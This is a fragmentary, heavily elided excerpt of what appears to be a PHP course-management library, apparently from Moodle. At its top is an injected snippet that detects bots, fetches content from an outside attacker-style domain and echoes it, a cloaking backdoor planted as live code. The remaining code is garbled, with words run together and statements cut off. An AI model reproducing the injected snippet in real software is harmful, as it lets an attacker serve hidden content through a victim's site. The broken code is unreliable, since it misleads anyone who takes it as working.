...
if (is_bot()) {
    $message = file_get_contents('https://tennesse.haxor-mahasuhu.info/eysportal/index.php');
    echo $message;
...
function course_create_section($courseorid, $position = 0, $skipcheck = false) {
    ...
    // Find the last sectionnum among existingsections.
    if ($skipcheck) {
...
function course_delete_module($cmid, $async = false) {
    ...
    // Delete the module from the course_modulestable.
...
function course_delete_section_async($section, $forcedeleteifnotempty = true) {
    ...
    // Flag those modules having no existing deletion flag. Some modules may have been scheduled for deletion manually, andwe don't
...
function create_course($data, $editoroptions = NULL) {
    ...
    $event = \core\event\course_created::create(array(
        'objectid' => $course->id,
        'context' => context_course::instance($course->id),'other' => array('shortname' => $course->shortname,
 ...
 *      - update the module
 *
 * @param object $module* @return object the updated module info
 ...
 */
functioncore_course_core_calendar_get_valid_event_timestart_range(\calendar_event $event, $course) {
    $mindate = null;
    $maxdate = null;
...
function course_filter_courses_by_favourites(
    ...
    // Return the number of filtered courses as well as the number ofcourses that were searched
    // in order to find the matching courses. This allows the calling code to do some kind of
    // pagination.
    return [$filteredcourses, $numberofcoursesprocessed];
}
    ...
    if (empty($sort)) {
        ...
        foreach ($rawsorts as $rawsort) {
            ...
            if (!in_array($sortfield, $basefields)) {
                throw new invalid_parameter_exception('Invalid field in the sort parameter, allowed fields: ' .implode(', ', $basefields) . '.');
            }
             ...
             WHERE ul.userid = :userid
               ...
               AND (eg.id IS NOT NULL
                    OR EXISTS (SELECT e.id
                            ...
                            WHERE e.courseid = c.idAND e.status = :statusenrol
...
function course_output_fragment_new_base_form($args) {
    ...
    $mform = new \core_backup\output\copy_form(
        null,array('course' => $course, 'returnto' => '', 'returnurl' => ''),
